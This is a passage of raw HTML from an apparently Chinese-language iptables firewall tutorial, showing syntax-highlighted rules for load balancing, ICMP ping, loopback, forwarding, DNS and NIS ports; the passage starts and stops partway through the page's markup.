id=\"crayon-594b21c976cca681102537\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 0 -j DNAT --to-destination 192.168.1.101:443\r\n#iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 1 -j DNAT --to-destination 192.168.1.102:443\r\n#iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 2 -j DNAT --to-destination 192.168.1.103:443</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976cca681102537-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cca681102537-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b21c976cca681102537-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976cca681102537-1\"><span class=\"crayon-p\">#iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 0 -j DNAT --to-destination 192.168.1.101:443</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cca681102537-2\"><span class=\"crayon-p\">#iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 1 -j DNAT --to-destination 192.168.1.102:443</span></div><div class=\"crayon-line\" id=\"crayon-594b21c976cca681102537-3\"><span class=\"crayon-p\">#iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 2 -j DNAT --to-destination 192.168.1.103:443</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h3># 12. 从内部向外部 Ping</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976ccd100165914\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\niptables -A OUTPUT -p icmp --icmp-type echo-request -j ACCEPT\r\niptables -A INPUT -p icmp --icmp-type echo-reply -j ACCEPT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976ccd100165914-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976ccd100165914-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976ccd100165914-1\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">OUTPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">icmp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">icmp</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">type </span><span class=\"crayon-v\">echo</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">request</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ACCEPT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976ccd100165914-2\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">INPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">icmp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">icmp</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">type </span><span class=\"crayon-v\">echo</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">reply</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ACCEPT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p></p>\n<h3># 13. 从外部向内部 Ping</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976cd0032747847\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\niptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT\r\niptables -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976cd0032747847-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cd0032747847-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976cd0032747847-1\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">INPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">icmp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">icmp</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">type </span><span class=\"crayon-v\">echo</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">request</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ACCEPT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cd0032747847-2\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">OUTPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">icmp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">icmp</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">type </span><span class=\"crayon-v\">echo</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">reply</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ACCEPT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p></p>\n<h3># 14. 允许环回（loopback）访问</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976cd3129268241\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\niptables -A INPUT -i lo -j ACCEPT\r\niptables -A OUTPUT -o lo -j ACCEPT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976cd3129268241-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cd3129268241-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976cd3129268241-1\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">INPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ACCEPT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cd3129268241-2\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">OUTPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ACCEPT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p></p>\n<h3># 15. 允许 packets 从内网访问外网</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976cd7841733398\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# if eth1 is connected to external network (internet)\r\n# if eth0 is connected to internal network (192.168.1.x)\r\niptables -A FORWARD -i eth0 -o eth1 -j ACCEPT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976cd7841733398-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cd7841733398-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b21c976cd7841733398-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976cd7841733398-1\"><span class=\"crayon-p\"># if eth1 is connected to external network (internet)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cd7841733398-2\"><span class=\"crayon-p\"># if eth0 is connected to internal network (192.168.1.x)</span></div><div class=\"crayon-line\" id=\"crayon-594b21c976cd7841733398-3\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">FORWARD</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ACCEPT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p></p>\n<h3># 16. 允许外出的  DNS</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976cdc050242189\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\niptables -A OUTPUT -p udp -o eth0 --dport 53 -j ACCEPT\r\niptables -A INPUT -p udp -i eth0 --sport 53 -j ACCEPT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976cdc050242189-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cdc050242189-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976cdc050242189-1\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">OUTPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">udp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">dport</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">53</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ACCEPT</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cdc050242189-2\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">INPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">udp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">sport</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">53</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ACCEPT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p></p>\n<h3># 17. 允许 NIS 连接</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976ce0487275447\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# rpcinfo -p | grep ypbind ; This port is 853 and 850\r\n#iptables -A INPUT -p tcp --dport 111 -j ACCEPT\r\n#iptables -A INPUT -p udp --dport 111 -j ACCEPT\r\n#iptables -A INPUT -p tcp --dport 853 -j ACCEPT\r\n#iptables -A INPUT -p udp --dport 853 -j ACCEPT\r\n#iptables -A INPUT -p tcp --dport 850 -j ACCEPT\r\n#iptables -A INPUT -p udp --dport 850 -j ACCEPT</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976ce0487275447-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976ce0487275447-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b21c976ce0487275447-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976ce0487275447-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b21c976ce0487275447-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976ce0487275447-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b21c976ce0487275447-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976ce0487275447-1\"><span class=\"crayon-p\"># rpcinfo -p | grep ypbind ; This port is 853 and 850</span></div><div class=\"crayon-line 